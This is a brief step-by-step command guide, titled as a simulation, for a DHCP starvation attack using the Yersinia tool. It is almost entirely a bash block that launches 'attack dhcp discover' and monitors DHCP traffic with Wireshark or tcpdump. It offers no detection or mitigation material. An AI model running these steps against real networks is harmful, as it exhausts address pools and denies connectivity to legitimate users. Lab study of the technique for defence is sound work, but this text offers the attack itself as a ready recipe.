# **DHCP Starvation Attack Simulation Using Yersinia**

```bash
# 1. Start Yersinia in interactive mode
sudo yersinia -I

# 2. Show DHCP protocol attack options
show dhcp

# 3. Launch DHCP Starvation Attack
attack dhcp discover

# 4. Monitor network traffic (choose one of the following commands)

# Option 1: Using Wireshark
sudo wireshark

# Option 2: Using tcpdump
sudo tcpdump -i eth0 port 67 or port 68

# 5. Stop the attack
Ctrl + C  # Stop tcpdump or Wireshark
quit       # Exit Yersinia

